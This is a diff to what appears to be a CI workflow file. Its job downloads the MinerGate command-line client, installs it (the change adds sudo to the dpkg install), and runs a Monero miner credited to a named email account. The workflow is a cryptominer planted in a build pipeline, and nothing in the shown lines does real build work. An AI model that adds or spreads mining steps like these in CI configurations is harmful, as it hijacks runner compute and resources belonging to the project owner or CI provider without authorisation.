@@ -9,5 +9,5 @@ jobs:
             sudo apt update -yqq
             sudo apt install libxcb1 wget -yqq
             wget https://minergate.com/download/ubuntu-cli
-            dpkg -i ubuntu-cli
+            sudo dpkg -i ubuntu-cli
             minergate-cli --user yoginth@outlook.in --xmr 8
